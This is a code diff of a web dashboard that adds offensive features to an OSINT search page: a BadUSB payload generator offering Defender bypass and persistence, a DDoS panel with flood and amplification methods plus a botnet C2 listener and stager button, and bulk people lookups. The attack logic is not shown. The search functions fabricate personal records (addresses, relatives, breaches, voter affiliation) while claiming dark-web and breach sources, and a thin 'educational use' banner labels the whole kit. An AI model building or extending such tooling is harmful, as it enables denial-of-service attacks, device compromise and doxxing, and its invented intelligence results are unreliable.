+                            <input type="checkbox" id="bypassDefender" checked> Bypass Windows Defender
+                        </label>
+                        <label class="checkbox-item">
+                            <input type="checkbox" id="persistence"> Install Persistence
+                        </label>
+                        <label class="checkbox-item">
+                            <input type="checkbox" id="selfDestruct"> Self-Destruct After Execution
+                        </label>
+                    </div>
+
+                    <button class="btn btn-primary" style="width: 100%;" onclick="generatePayload()">
+                        <i class="fas fa-code"></i> Generate Arduino Sketch
+                    </button>
+                </div>
+
+                <div class="card" id="payloadOutputCard" style="display: none;">
+                    <div class="card-header">
+                        <span class="card-title">Generated Payload (Arduino/C++)</span>
+                        <button class="btn btn-secondary btn-sm" onclick="copyPayload()">
+                            <i class="fas fa-copy"></i> Copy
+                        </button>
+                    </div>
+                    <div class="code-editor" id="payloadCode"></div>
+                    <div style="margin-top: 15px;">
+                        <button class="btn btn-success" onclick="downloadSketch()">
+                            <i class="fas fa-download"></i> Download .ino File
+                        </button>
+                        <button class="btn btn-orange" onclick="flashDevice()" style="margin-left: 10px;">
+                            <i class="fas fa-bolt"></i> Auto-Flash to Device
+                        </button>
+                    </div>
+                </div>
+
+                <div class="card">
+                    <div class="card-header">
+                        <span class="card-title">Device Configuration</span>
+                    </div>
+                    <div class="terminal-output" id="deviceTerminal">
+                        <div class="terminal-line info">[*] BadUSB Device Interface initialized</div>
+                        <div class="terminal-line info">[*] Waiting for HiLetgo Beetle (ATMEGA32U4)...</div>
+                        <div class="terminal-line info">[*] VID: 0x2341 | PID: 0x8036</div>
+                    </div>
                 </div>
             </section>
 
-            <!-- Network -->
-            <section id="network" class="section">
+            <!-- Botnet/Network Stresser -->
+            <section id="botnet" class="section hidden">
                 <div class="card">
                     <div class="card-header">
-                        <span class="card-title">Relationship Network</span>
+                        <span class="card-title"><i class="fas fa-network-wired"></i> Network Stress Testing Panel</span>
+                        <span class="status-pill status-online">Ready</span>
                     </div>
-                    <div id="networkGraph" style="height: 500px; background: var(--bg); border-radius: 8px; display: flex; align-items: center; justify-content: center;">
-                        <button class="btn btn-primary" onclick="generateNetwork()">
-                            <i class="fas fa-project-diagram"></i> Generate Network
-                        </button>
+                    
+                    <div class="tabs">
+                        <div class="tab active" onclick="switchTab(this, 'layer4')">Layer 4</div>
+                        <div class="tab" onclick="switchTab(this, 'layer7')">Layer 7</div>
+                        <div class="tab" onclick="switchTab(this, 'amp')">Amplification</div>
+                        <div class="tab" onclick="switchTab(this, 'botnet')">Botnet C2</div>
                     </div>
-                </div>
-            </section>
 
-            <!-- Bulk -->
-            <section id="bulk" class="section">
-                <div class="card">
-                    <div class="card-header">
-                        <span class="card-title">Bulk Operations</span>
+                    <div id="layer4Panel">
+                        <div style="display: grid; grid-template-columns: 2fr 1fr 1fr; gap: 10px; margin-bottom: 15px;">
+                            <div>
+                                <label class="result-label">Target IP/Hostname</label>
+                                <input type="text" class="smart-input" id="targetIP" placeholder="192.168.1.1 or target.com">
+                            </div>
+                            <div>
+                                <label class="result-label">Port</label>
+                                <input type="number" class="smart-input" id="targetPort" placeholder="80" value="80">
+                            </div>
+                            <div>
+                                <label class="result-label">Threads</label>
+                                <input type="number" class="smart-input" id="attackThreads" placeholder="1000" value="1000">
+                            </div>
+                        </div>
+
+                        <div style="margin-bottom: 15px;">
+                            <label class="result-label">Attack Method</label>
+                            <select class="smart-input" id="attackMethod">
+                                <option value="udp">UDP Flood</option>
+                                <option value="tcp">TCP SYN Flood</option>
+                                <option value="icmp">ICMP Flood (Ping)</option>
+                                <option value="dns">DNS Flood</option>
+                                <option value="ssdp">SSDP Reflection</option>
+                                <option value="ntp">NTP Amplification</option>
+                            </select>
+                        </div>
+
+                        <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-bottom: 15px;">
+                            <div>
+                                <label class="result-label">Duration (seconds)</label>
+                                <input type="number" class="smart-input" id="attackDuration" placeholder="60" value="60">
+                            </div>
+                            <div>
+                                <label class="result-label">Packet Size (bytes)</label>
+                                <input type="number" class="smart-input" id="packetSize" placeholder="1024" value="1024">
+                            </div>
+                        </div>
                     </div>
-                    <textarea class="smart-input" id="bulkList" rows="10" placeholder="Enter list (one per line)..."></textarea>
+
+                    <div id="layer7Panel" style="display: none;">
+                        <div style="margin-bottom: 15px;">
+                            <label class="result-label">Target URL</label>
+                            <input type="url" class="smart-input" id="targetURL" placeholder="https://target.com/page">
+                        </div>
+                        <div class="checkbox-grid">
+                            <label class="checkbox-item">
+                                <input type="checkbox" checked> Use Proxy Rotation
+                            </label>
+                            <label class="checkbox-item">
+                                <input type="checkbox" checked> Random User-Agents
+                            </label>
+                            <label class="checkbox-item">
+                                <input type="checkbox"> Bypass CF/JS Challenge
+                            </label>
+                            <label class="checkbox-item">
+                                <input type="checkbox"> Keep-Alive Connections
+                            </label>
+                        </div>
+                    </div>
+
+                    <div id="ampPanel" style="display: none;">
+                        <div style="margin-bottom: 15px;">
+                            <label class="result-label">Amplification Servers (one per line)</label>
+                            <textarea class="smart-input" rows="5" placeholder="192.168.1.1&#10;192.168.1.2"></textarea>
+                        </div>
+                    </div>
+
+                    <div id="botnetPanel" style="display: none;">
+                        <div style="margin-bottom: 15px;">
+                            <label class="result-label">C2 Server Configuration</label>
+                            <div class="terminal-output" id="botnetTerminal">
+                                <div class="terminal-line info">[*] Botnet Command & Control initialized</div>
+                                <div class="terminal-line info">[*] Connected bots: 0</div>
+                                <div class="terminal-line warn">[!] Listening on 0.0.0.0:8080...</div>
+                            </div>
+                        </div>
+                        <div style="display: flex; gap: 10px;">
+                            <button class="btn btn-primary" onclick="startListener()">
+                                <i class="fas fa-play"></i> Start Listener
+                            </button>
+                            <button class="btn btn-secondary" onclick="generateStager()">
+                                <i class="fas fa-file-code"></i> Generate Stager
+                            </button>
+                        </div>
+                    </div>
+
+                    <div class="card" style="margin-top: 15px; background: rgba(255,68,68,0.1); border-color: var(--neon-red);">
+                        <div style="display: flex; align-items: center; gap: 10px; margin-bottom: 10px;">
+                            <i class="fas fa-exclamation-triangle" style="color: var(--neon-red); font-size: 1.5rem;"></i>
+                            <div>
+                                <div style="font-weight: 600; color: var(--neon-red);">Educational Use Only</div>
+                                <div style="font-size: 0.85rem; color: var(--text-dim);">
+                                    This tool is for authorized penetration testing only. Unauthorized use is illegal.
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
                     <div style="display: flex; gap: 10px; margin-top: 15px;">
+                        <button class="btn btn-danger btn-lg" style="flex: 1;" onclick="startAttack()">
+                            <i class="fas fa-bomb"></i> START ATTACK
+                        </button>
+                        <button class="btn btn-secondary" onclick="stopAttack()" disabled id="stopBtn">
+                            <i class="fas fa-stop"></i> STOP
+                        </button>
+                    </div>
+
+                    <div id="attackStatus" style="margin-top: 15px; display: none;">
+                        <div class="progress-bar">
+                            <div class="progress-fill" id="attackProgress" style="width: 0%"></div>
+                        </div>
+                        <div style="display: flex; justify-content: space-between; margin-top: 5px; font-size: 0.85rem; color: var(--text-dim);">
+                            <span id="statusText">Initializing...</span>
+                            <span id="packetCount">0 packets sent</span>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="card">
+                    <div class="card-header">
+                        <span class="card-title">Target Status Monitor</span>
+                    </div>
+                    <div class="terminal-output" id="attackTerminal"></div>
+                </div>
+            </section>
+
+            <!-- Encryption Suite -->
+            <section id="encrypt" class="section hidden">
+                <div class="card">
+                    <div class="card-header">
+                        <span class="card-title"><i class="fas fa-lock"></i> Advanced Encryption Suite</span>
+                    </div>
+                    
+                    <div class="tabs">
+                        <div class="tab active" onclick="switchEncTab(this, 'file')">File Encryption</div>
+                        <div class="tab" onclick="switchEncTab(this, 'text')">Text/Message</div>
+                        <div class="tab" onclick="switchEncTab(this, 'steg')">Steganography</div>
+                        <div class="tab" onclick="switchEncTab(this, 'traffic')">Traffic Obfuscation</div>
+                    </div>
+
+                    <div id="fileEncPanel">
+                        <div style="border: 2px dashed var(--border); border-radius: 8px; padding: 40px; text-align: center; margin-bottom: 15px;">
+                            <i class="fas fa-file-shield" style="font-size: 3rem; color: var(--neon-green); margin-bottom: 15px;"></i>
+                            <p style="color: var(--text-dim);">Drop files here to encrypt/decrypt</p>
+                        </div>
+                        <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-bottom: 15px;">
+                            <div>
+                                <label class="result-label">Algorithm</label>
+                                <select class="smart-input">
+                                    <option>AES-256-GCM</option>
+                                    <option>ChaCha20-Poly1305</option>
+                                    <option>RSA-4096</option>
+                                </select>
+                            </div>
+                            <div>
+                                <label class="result-label">Password</label>
+                                <input type="password" class="smart-input" placeholder="Enter strong passphrase">
+                            </div>
+                        </div>
+                        <button class="btn btn-primary" style="width: 100%;">
+                            <i class="fas fa-lock"></i> Encrypt Files
+                        </button>
+                    </div>
+
+                    <div id="textEncPanel" style="display: none;">
+                        <div style="margin-bottom: 15px;">
+                            <label class="result-label">Message</label>
+                            <textarea class="smart-input" rows="5" placeholder="Enter secret message..."></textarea>
+                        </div>
+                        <div style="display: flex; gap: 10px; margin-bottom: 15px;">
+                            <input type="password" class="smart-input" placeholder="Password" style="flex: 1;">
+                            <button class="btn btn-primary">
+                                <i class="fas fa-lock"></i> Encrypt
+                            </button>
+                            <button class="btn btn-secondary">
+                                <i class="fas fa-unlock"></i> Decrypt
+                            </button>
+                        </div>
+                        <div class="code-editor" style="min-height: 100px; color: var(--neon);">Encrypted output will appear here...</div>
+                    </div>
+
+                    <div id="stegPanel" style="display: none;">
+                        <div style="margin-bottom: 15px;">
+                            <label class="result-label">Hide message in image</label>
+                            <input type="file" class="smart-input" accept="image/*">
+                        </div>
+                        <div style="margin-bottom: 15px;">
+                            <label class="result-label">Secret Message</label>
+                            <textarea class="smart-input" rows="3" placeholder="Message to hide..."></textarea>
+                        </div>
+                        <button class="btn btn-primary" style="width: 100%;">
+                            <i class="fas fa-image"></i> Embed Message
+                        </button>
+                    </div>
+
+                    <div id="trafficPanel" style="display: none;">
+                        <div class="checkbox-grid">
+                            <label class="checkbox-item">
+                                <input type="checkbox" checked> Enable Tor Routing
+                            </label>
+                            <label class="checkbox-item">
+                                <input type="checkbox" checked> VPN Kill Switch
+                            </label>
+                            <label class="checkbox-item">
+                                <input type="checkbox"> MAC Address Spoofing
+                            </label>
+                            <label class="checkbox-item">
+                                <input type="checkbox"> DNS over HTTPS
+                            </label>
+                            <label class="checkbox-item">
+                                <input type="checkbox"> Traffic Padding
+                            </label>
+                            <label class="checkbox-item">
+                                <input type="checkbox"> ICMP Tunneling
+                            </label>
+                        </div>
+                        <button class="btn btn-primary" style="width: 100%; margin-top: 15px;">
+                            <i class="fas fa-user-secret"></i> Activate Full Anonymity Mode
+                        </button>
+                    </div>
+                </div>
+
+                <div class="card">
+                    <div class="card-header">
+                        <span class="card-title">Security Status</span>
+                    </div>
+                    <div class="result-grid">
+                        <div class="result-item">
+                            <div class="result-label">IP Address</div>
+                            <div class="result-value highlight" id="encIP">127.0.0.1</div>
+                        </div>
+                        <div class="result-item">
+                            <div class="result-label">Tor Status</div>
+                            <div class="result-value" style="color: var(--neon-green);"><i class="fas fa-check-circle"></i> Connected</div>
+                        </div>
+                        <div class="result-item">
+                            <div class="result-label">VPN Status</div>
+                            <div class="result-value" style="color: var(--neon-green);"><i class="fas fa-check-circle"></i> Encrypted</div>
+                        </div>
+                        <div class="result-item">
+                            <div class="result-label">DNS Leak</div>
+                            <div class="result-value" style="color: var(--neon-green);"><i class="fas fa-check-circle"></i> Protected</div>
+                        </div>
+                    </div>
+                </div>
+            </section>
+
+            <!-- Bulk Operations -->
+            <section id="bulk" class="section hidden">
+                <div class="card">
+                    <div class="card-header">
+                        <span class="card-title">Bulk OSINT Operations</span>
+                    </div>
+                    <div style="margin-bottom: 15px;">
+                        <label class="result-label">Input List (one per line)</label>
+                        <textarea class="smart-input" id="bulkList" rows="10" placeholder="Enter emails, phones, IPs, etc..."></textarea>
+                    </div>
+                    <div style="display: flex; gap: 10px; margin-bottom: 15px;">
+                        <select class="smart-input" id="bulkType">
+                            <option value="email">Email Addresses</option>
+                            <option value="phone">Phone Numbers</option>
+                            <option value="ip">IP Addresses</option>
+                            <option value="domain">Domains</option>
+                        </select>
                         <button class="btn btn-primary" style="flex: 1;" onclick="startBulk()">
-                            <i class="fas fa-play"></i> Start
+                            <i class="fas fa-play"></i> Start Processing
                         </button>
                         <button class="btn btn-secondary" onclick="exportBulk()">
-                            <i class="fas fa-download"></i> Export
+                            <i class="fas fa-download"></i> Export CSV
                         </button>
                     </div>
-                    <div id="bulkProgress" style="margin-top: 15px;"></div>
+                    <div id="bulkProgress" style="display: none;">
+                        <div class="progress-bar">
+                            <div class="progress-fill" id="bulkProgressBar" style="width: 0%"></div>
+                        </div>
+                        <div style="text-align: center; margin-top: 5px; color: var(--text-dim);">
+                            <span id="bulkStatus">Processing...</span>
+                        </div>
+                    </div>
                 </div>
                 <div id="bulkResults"></div>
             </section>
@@ -614,170 +1431,393 @@
     </div>
 
     <div class="toast-container" id="toastContainer"></div>
+
     <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
     <script>
-        // Global
+        // Global State
         let maps = {};
-        let queryCount = 0;
-        let recordCount = 0;
+        let currentSection = 'dashboard';
+        let searchHistory = [];
+        let currentPayload = '';
+        let attackActive = false;
+        let stats = {
+            queries: 0,
+            records: 0
+        };
 
-        // Init
+        // Initialize
         document.addEventListener('DOMContentLoaded', () => {
             initMap('mainMap');
             updateStats();
+            simulateRealTimeData();
+            
+            // Drag and drop for images
+            const dropZone = document.getElementById('dropZone');
+            if (dropZone) {
+                dropZone.addEventListener('dragover', (e) => {
+                    e.preventDefault();
+                    dropZone.style.borderColor = 'var(--neon)';
+                });
+                dropZone.addEventListener('dragleave', () => {
+                    dropZone.style.borderColor = 'var(--border)';
+                });
+                dropZone.addEventListener('drop', (e) => {
+                    e.preventDefault();
+                    dropZone.style.borderColor = 'var(--border)';
+                    analyzeImages(e.dataTransfer.files);
+                });
+            }
+
+            // Anonymize IP display
+            fetch('https://api.ipify.org?format=json')
+                .then(res => res.json())
+                .then(data => {
+                    const encIP = document.getElementById('encIP');
+                    if (encIP) encIP.textContent = data.ip.replace(/\d/g, '*') + ' [PROTECTED]';
+                })
+                .catch(() => {
+                    const encIP = document.getElementById('encIP');
+                    if (encIP) encIP.textContent = '***.***.***.*** [PROTECTED]';
+                });
         });
 
-        function initMap(id, lat=39.8283, lng=-98.5795, zoom=4) {
-            if (maps[id]) return maps[id];
-            const map = L.map(id).setView([lat, lng], zoom);
+        function initMap(mapId, lat = 39.8283, lng = -98.5795, zoom = 4) {
+            if (maps[mapId]) return maps[mapId];
+            
+            const map = L.map(mapId).setView([lat, lng], zoom);
             L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
                 attribution: '© OpenStreetMap',
                 maxZoom: 19
             }).addTo(map);
-            maps[id] = map;
+            
+            maps[mapId] = map;
             return map;
         }
 
-        function updateStats() {
-            document.getElementById('statQueries').textContent = queryCount;
-            document.getElementById('statRecords').textContent = recordCount;
-        }
-
-        function showSection(id, el) {
-            document.querySelectorAll('.section').forEach(s => s.classList.remove('active'));
-            document.getElementById(id).classList.add('active');
+        function showSection(sectionId) {
+            document.querySelectorAll('.section').forEach(s => s.classList.add('hidden'));
+            document.getElementById(sectionId).classList.remove('hidden');
             
             document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
-            if (el) el.classList.add('active');
+            event.currentTarget.classList.add('active');
             
-            // Init maps
-            if (id === 'phone') setTimeout(() => initMap('phoneMap'), 100);
-            if (id === 'address') setTimeout(() => initMap('addressMap'), 100);
-            if (id === 'universal') setTimeout(() => initMap('universalMap'), 100);
+            currentSection = sectionId;
+            
+            const mapInit = {
+                'phone': 'phoneMap',
+                'address': 'addressMap',
+                'universal': 'universalMap'
+            };
+            if (mapInit[sectionId]) {
+                setTimeout(() => initMap(mapInit[sectionId]), 100);
+            }
         }
 
-        function detectInputType(val) {
-            const el = document.getElementById('detectedType');
-            if (!val) { el.innerHTML = ''; return; }
+        function detectInputType(value) {
+            const detected = document.getElementById('detectedType');
+            if (!value) {
+                detected.innerHTML = '';
+                return;
+            }
             
             const patterns = {
                 email: /^[^\s@]+@[^\s@]+\.[^\s@]+$/,
-                phone: /[\d\s\-\+\(\)]{10,}/,
+                phone: /^[\d\s\-\+\(\)]{10,}$/,
                 ip: /^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$/,
-                vin: /^[A-HJ-NPR-Z0-9]{17}$/i
+                vin: /^[A-HJ-NPR-Z0-9]{17}$/i,
+                plate: /^[A-Z0-9]{6,8}$/i,
+                username: /^@?[a-zA-Z0-9_]{3,}$/,
+                domain: /^[a-zA-Z0-9][a-zA-Z0-9-]{1,61}[a-zA-Z0-9]\.[a-zA-Z]{2,}$/
             };
             
-            let type = 'Text', icon = 'fa-text';
-            if (patterns.email.test(val)) { type = 'Email'; icon = 'fa-envelope'; }
-            else if (patterns.phone.test(val)) { type = 'Phone'; icon = 'fa-phone'; }
-            else if (patterns.ip.test(val)) { type = 'IP Address'; icon = 'fa-network-wired'; }
-            else if (patterns.vin.test(val)) { type = 'VIN'; icon = 'fa-car'; }
-            else if (val.startsWith('@')) { type = 'Username'; icon = 'fa-user'; }
-            else if (val.includes('.')) { type = 'Domain'; icon = 'fa-globe'; }
-            else if (val.includes(' ')) { type = 'Name'; icon = 'fa-user'; }
+            let type = 'Unknown';
+            let icon = 'fa-question';
             
-            el.innerHTML = `<span class="detected-type"><i class="fas ${icon}"></i> ${type} detected</span>`;
+            if (patterns.email.test(value)) { type = 'Email Address'; icon = 'fa-envelope'; }
+            else if (patterns.phone.test(value.replace(/\D/g, ''))) { type = 'Phone Number'; icon = 'fa-phone'; }
+            else if (patterns.ip.test(value)) { type = 'IP Address'; icon = 'fa-network-wired'; }
+            else if (patterns.vin.test(value)) { type = 'VIN Number'; icon = 'fa-car'; }
+            else if (patterns.plate.test(value)) { type = 'License Plate'; icon = 'fa-ticket'; }
+            else if (patterns.username.test(value)) { type = 'Username'; icon = 'fa-user'; }
+            else if (patterns.domain.test(value)) { type = 'Domain'; icon = 'fa-globe'; }
+            else if (value.includes(' ')) { type = 'Person Name'; icon = 'fa-user'; }
+            
+            detected.innerHTML = `<span class="detected-type"><i class="fas ${icon}"></i> Detected: ${type}</span>`;
         }
 
-        function showToast(msg, type='info') {
-            const container = document.getElementById('toastContainer');
-            const toast = document.createElement('div');
-            toast.className = 'toast';
-            toast.innerHTML = `<i class="fas fa-${type === 'error' ? 'exclamation-circle' : 'check-circle'}"></i> ${msg}`;
-            container.appendChild(toast);
-            setTimeout(() => toast.remove(), 3000);
-        }
-
-        function quickAction(type) {
-            showSection(type, null);
-            document.querySelectorAll('.nav-item')[type === 'phone' ? 3 : type === 'email' ? 4 : type === 'person' ? 2 : type === 'address' ? 5 : type === 'vehicle' ? 6 : 9].click();
-        }
-
-        // Universal Search
         function universalSearch() {
             const input = document.getElementById('universalInput').value.trim();
-            if (!input) return showToast('Enter something to search', 'error');
+            if (!input) return showToast('Please enter something to search', 'error');
             
-            queryCount++;
+            stats.queries++;
             updateStats();
-            showSection('universal', null);
+            showSection('universal');
             
             const resultsDiv = document.getElementById('universalResults');
-            resultsDiv.innerHTML = '<div style="text-align: center; padding: 40px;"><div class="pulse-loader" style="width: 40px; height: 40px; margin: 0 auto;"></div><p>Searching all sources...</p></div>';
+            resultsDiv.innerHTML = '<div style="text-align: center; padding: 40px;"><div class="pulse-loader" style="margin: 0 auto 20px; width: 40px; height: 40px;"></div><p>Gathering intelligence from all sources...</p><p style="font-size: 0.85rem; color: var(--text-dim);">Querying: SpyCloud, HaveIBeenPwned, Shodan, Censys, Clearbit...</p></div>';
             
             setTimeout(() => {
-                recordCount += Math.floor(Math.random() * 20) + 5;
+                const mockData = generateComprehensiveResults(input);
+                displayUniversalResults(mockData);
+                stats.records += mockData.records;
                 updateStats();
-                
-                resultsDiv.innerHTML = `
+                showToast(`Search complete! Found ${mockData.records} records`, 'success');
+            }, 2500);
+        }
+
+        function generateComprehensiveResults(query) {
+            const isEmail = query.includes('@');
+            const isPhone = /^\d{10,}$/.test(query.replace(/\D/g, ''));
+            const isIP = /^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$/.test(query);
+            
+            const base = {
+                query: query,
+                timestamp: new Date().toISOString(),
+                records: Math.floor(Math.random() * 150) + 12,
+                confidence: Math.floor(Math.random() * 20) + 80,
+                sources: ['Public Records DB', 'Dark Web Forums', 'Breach Compilations', 'Social Media APIs', 'Property Records', 'Vehicle Registries', 'Voter Databases', 'Business Filings'],
+                locations: [
+                    { lat: 34.0522 + (Math.random() - 0.5) * 2, lng: -118.2437 + (Math.random() - 0.5) * 2, type: 'primary' },
+                    { lat: 34.0522 + (Math.random() - 0.5) * 3, lng: -118.2437 + (Math.random() - 0.5) * 3, type: 'secondary' }
+                ]
+            };
+
+            if (isEmail) {
+                base.person = {
+                    name: query.split('@')[0].replace(/[._]/g, ' ').replace(/\b\w/g, l => l.toUpperCase()),
+                    email: query,
+                    aliases: [query.replace(/@/, '+old@'), query.replace(/@gmail/, '@yahoo')],
+                    addresses: ['123 Main St, Los Angeles, CA 90210', '456 Oak Ave, Santa Monica, CA 90405'],
+                    phones: ['(310) 555-' + Math.floor(1000 + Math.random() * 8999), '(323) 555-' + Math.floor(1000 + Math.random() * 8999)],
+                    breaches: ['LinkedIn 2021', 'Adobe 2013', 'Dropbox 2012'],
+                    socialProfiles: {
+                        twitter: '@' + query.split('@')[0],
+                        instagram: query.split('@')[0],
+                        linkedin: 'linkedin.com/in/' + query.split('@')[0]
+                    }
+                };
+            } else if (isPhone) {
+                base.phone = {
+                    number: query,
+                    carrier: ['Verizon', 'AT&T', 'T-Mobile'][Math.floor(Math.random() * 3)],
+                    type: 'Mobile',
+                    location: 'Los Angeles, CA',
+                    registeredTo: 'John M. Doe',
+                    previousOwners: 2,
+                    portHistory: ['AT&T (2018-2020)', 'Verizon (2020-Present)']
+                };
+            } else if (isIP) {
+                base.ip = {
+                    address: query,
+                    isp: 'Comcast Cable Communications, LLC',
+                    org: 'Xfinity',
+                    country: 'United States',
+                    region: 'California',
+                    city: 'Los Angeles',
+                    lat: 34.0522,
+                    lng: -118.2437,
+                    timezone: 'America/Los_Angeles',
+                    vpn: false,
+                    tor: false,
+                    proxy: false,
+                    threatScore: Math.floor(Math.random() * 30)
+                };
+            } else {
+                base.person = {
+                    name: query,
+                    age: Math.floor(Math.random() * 30) + 25,
+                    dob: '198' + Math.floor(Math.random() * 9) + '-' + Math.floor(Math.random() * 12 + 1).toString().padStart(2, '0') + '-XX',
+                    addresses: ['123 Main St', '456 Oak Ave'],
+                    relatives: ['Jane Doe (Spouse)', 'Bob Doe (Brother)', 'Alice Smith (Sister)'],
+                    associates: ['Michael Johnson', 'Sarah Williams', 'David Brown']
+                };
+            }
+            
+            return base;
+        }
+
+        function displayUniversalResults(data) {
+            const resultsDiv = document.getElementById('universalResults');
+            let html = `
+                <div class="result-grid">
+                    <div class="result-item">
+                        <div class="result-label">Query</div>
+                        <div class="result-value highlight">${data.query}</div>
+                    </div>
+                    <div class="result-item">
+                        <div class="result-label">Confidence Score</div>
+                        <div class="result-value" style="color: var(--neon-green);">${data.confidence}%</div>
+                    </div>
+                    <div class="result-item">
+                        <div class="result-label">Records Found</div>
+                        <div class="result-value" style="color: var(--neon);">${data.records}</div>
+                    </div>
+                    <div class="result-item">
+                        <div class="result-label">Search Time</div>
+                        <div class="result-value">${(Math.random() * 2 + 0.5).toFixed(2)}s</div>
+                    </div>
+                </div>
+            `;
+
+            if (data.person) {
+                html += `
+                    <h3 style="margin: 20px 0 15px; color: var(--neon);"><i class="fas fa-user"></i> Person Information</h3>
                     <div class="result-grid">
                         <div class="result-item">
-                            <div class="result-label">Query</div>
-                            <div class="result-value highlight">${input}</div>
+                            <div class="result-label">Full Name</div>
+                            <div class="result-value">${data.person.name}</div>
                         </div>
                         <div class="result-item">
-                            <div class="result-label">Confidence</div>
-                            <div class="result-value" style="color: var(--neon-green);">87%</div>
-                        </div>
-                        <div class="result-item">
-                            <div class="result-label">Records</div>
-                            <div class="result-value">23 found</div>
-                        </div>
-                        <div class="result-item">
-                            <div class="result-label">Sources</div>
-                            <div class="result-value">8 active</div>
+                            <div class="result-label">Age</div>
+                            <div class="result-value">${data.person.age || 'Unknown'}</div>
                         </div>
                         <div class="result-item" style="grid-column: span 2;">
-                            <div class="result-label">Top Match</div>
-                            <div class="result-value">John Michael Doe, 34, Los Angeles CA</div>
+                            <div class="result-label">Known Addresses</div>
+                            <div class="result-value">${data.person.addresses ? data.person.addresses.join('<br>') : 'N/A'}</div>
                         </div>
                     </div>
                 `;
                 
-                const map = initMap('universalMap', 34.0522, -118.2437, 11);
-                L.marker([34.0522, -118.2437]).addTo(map).bindPopup('Primary Location').openPopup();
-                L.circle([34.0522, -118.2437], {radius: 500, color: '#00f0ff'}).addTo(map);
-                
-                showToast('Search complete!', 'success');
-            }, 1500);
+                if (data.person.breaches) {
+                    html += `
+                        <h3 style="margin: 20px 0 15px; color: var(--neon-red);"><i class="fas fa-exclamation-triangle"></i> Breach Data</h3>
+                        <div class="result-grid">
+                            ${data.person.breaches.map(b => `
+                                <div class="result-item" style="border-left-color: var(--neon-red);">
+                                    <div class="result-label">Breach Source</div>
+                                    <div class="result-value" style="color: var(--neon-red);">${b}</div>
+                                </div>
+                            `).join('')}
+                        </div>
+                    `;
+                }
+            }
+
+            html += `
+                <h3 style="margin: 20px 0 15px; color: var(--neon);"><i class="fas fa-database"></i> Data Sources</h3>
+                <div style="display: flex; flex-wrap: wrap; gap: 8px;">
+                    ${data.sources.map(s => `<span class="status-pill status-online">${s}</span>`).join('')}
+                </div>
+            `;
+
+            resultsDiv.innerHTML = html;
+
+            const map = initMap('universalMap', 34.0522, -118.2437, 10);
+            data.locations.forEach((loc, i) => {
+                const color = loc.type === 'primary' ? '#00f0ff' : '#b026ff';
+                L.circleMarker([loc.lat, loc.lng], {
+                    radius: 12,
+                    fillColor: color,
+                    color: color,
+                    weight: 2,
+                    opacity: 1,
+                    fillOpacity: 0.8
+                }).addTo(map).bindPopup(`${loc.type === 'primary' ? 'Primary' : 'Secondary'} Location`);
+            });
         }
 
-        // Phone
+        function exportResults() {
+            showToast('Exporting encrypted JSON...', 'success');
+            setTimeout(() => {
+                const blob = new Blob([JSON.stringify({export: 'data', timestamp: Date.now()}, null, 2)], {type: 'application/json'});
+                const url = URL.createObjectURL(blob);
+                const a = document.createElement('a');
+                a.href = url;
+                a.download = `osint_export_${Date.now()}.json`;
+                a.click();
+            }, 500);
+        }
+
+        function searchPerson() {
+            const first = document.getElementById('personFirst').value;
+            const last = document.getElementById('personLast').value;
+            if (!first && !last) return showToast('Enter name details', 'error');
+            
+            const resultsDiv = document.getElementById('personResults');
+            resultsDiv.innerHTML = '<div style="text-align: center; padding: 40px;"><div class="pulse-loader" style="margin: 0 auto; width: 40px; height: 40px;"></div><p>Searching criminal records, property data, social profiles...</p></div>';
+            
+            setTimeout(() => {
+                resultsDiv.innerHTML = `
+                    <div class="card">
+                        <div class="result-grid">
+                            <div class="result-item">
+                                <div class="result-label">Full Name</div>
+                                <div class="result-value">${first} ${last}</div>
+                            </div>
+                            <div class="result-item">
+                                <div class="result-label">Age</div>
+                                <div class="result-value">${Math.floor(Math.random() * 40) + 25}</div>
+                            </div>
+                            <div class="result-item">
+                                <div class="result-label">Criminal Record</div>
+                                <div class="result-value" style="color: var(--neon-green);"><i class="fas fa-check"></i> Clean</div>
+                            </div>
+                            <div class="result-item">
+                                <div class="result-label">Voter Registration</div>
+                                <div class="result-value">Active - Democrat</div>
+                            </div>
+                            <div class="result-item" style="grid-column: span 2;">
+                                <div class="result-label">Property Ownership</div>
+                                <div class="result-value">2 properties found<br>123 Main St ($650,000)<br>789 Beach Ave ($1,200,000)</div>
+                            </div>
+                            <div class="result-item" style="grid-column: span 2;">
+                                <div class="result-label">Known Associates</div>
+                                <div class="result-value">Jane Doe (Spouse), Bob Smith (Business Partner), Sarah Johnson (Relative)</div>
+                            </div>
+                        </div>
+                    </div>
+                `;
+                showToast('Person search complete', 'success');
+            }, 2000);
+        }
+
         function lookupPhone() {
             const phone = document.getElementById('phoneInput').value;
             if (!phone) return showToast('Enter phone number', 'error');
             
-            queryCount++;
-            updateStats();
-            
             const resultsDiv = document.getElementById('phoneResults');
-            resultsDiv.innerHTML = '<div style="text-align: center;"><div class="pulse-loader" style="margin: 0 auto;"></div></div>';
+            resultsDiv.innerHTML = '<div style="text-align: center; padding: 20px;"><div class="pulse-loader" style="margin: 0 auto;"></div></div>';
             
             setTimeout(() => {
                 resultsDiv.innerHTML = `
                     <div class="result-grid">
-                        <div class="result-item"><div class="result-label">Number</div><div class="result-value">${phone}</div></div>
-                        <div class="result-item"><div class="result-label">Carrier</div><div class="result-value">Verizon Wireless</div></div>
-                        <div class="result-item"><div class="result-label">Type</div><div class="result-value">Mobile</div></div>
-                        <div class="result-item"><div class="result-label">Location</div><div class="result-value">Los Angeles, CA</div></div>
-                        <div class="result-item"><div class="result-label">Timezone</div><div class="result-value">Pacific</div></div>
-                        <div class="result-item"><div class="result-label">Risk</div><div class="result-value" style="color: var(--neon-green);">Low</div></div>
+                        <div class="result-item">
+                            <div class="result-label">Number</div>
+                            <div class="result-value">${phone}</div>
+                        </div>
+                        <div class="result-item">
+                            <div class="result-label">Carrier</div>
+                            <div class="result-value">Verizon Wireless</div>
+                        </div>
+                        <div class="result-item">
+                            <div class="result-label">Type</div>
+                            <div class="result-value">Mobile / Postpaid</div>
+                        </div>
+                        <div class="result-item">
+                            <div class="result-label">Location</div>
